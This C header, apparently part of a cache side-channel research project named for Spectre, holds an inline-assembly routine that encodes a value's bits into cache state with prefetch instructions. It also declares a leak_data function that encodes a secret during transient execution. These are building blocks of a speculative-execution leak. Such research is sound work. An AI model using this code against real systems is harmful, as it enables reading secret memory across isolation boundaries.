#include <stdint.h>
#include <stdio.h>

#include "../include/constants.h"
#include "../include/instructions.h"


#ifndef CBSC_MEASUREMENT_SPECTRE_H
#define CBSC_MEASUREMENT_SPECTRE_H

static inline __always_inline void asm_encode_data(
            uint64_t data, uint8_t *channel,
            uint8_t bits_count, uint64_t stride)
{
    __asm__ volatile("xor %%rax, %%rax\n"

                     "movb $0x0, %%bl\n"
                     "movq $0x1, %%rcx\n"
                     "movq %[stride], %%rdx\n"
                     "movb %[bitscount], %%sil\n"
                     "enc:\n"

                     "addb $0x1, %%bl\n"
                     "addq %%rdx,%[channel]\n"
                     "movq %[data], %%rax\n"
                     "andq %%rcx, %%rax\n"
                     "testq %%rax, %%rax\n"
                     "jz nenc\n"
                     "prefetcht0 (%[channel])\n"

                     "nenc:\n"
                     "sal $0x1, %%rcx\n"
                     "cmpb %%sil, %%bl\n"
                     "jne enc\n"
                     :
                     : [data] "r"(data), [channel] "r"(channel), [stride] "r"(stride), [bitscount] "r"(bits_count)
                     : "rax", "rbx", "rcx", "rdx", "rsi", "cc"
    );
}

// returns true during the training phase, false if encoding can only happen transiently
bool leak_data(uint32_t iteration, uint32_t *train_data,
    uint32_t train_data_len, uint64_t secret, uint8_t channel[],
    uint8_t bits_count, uint64_t stride);

#endif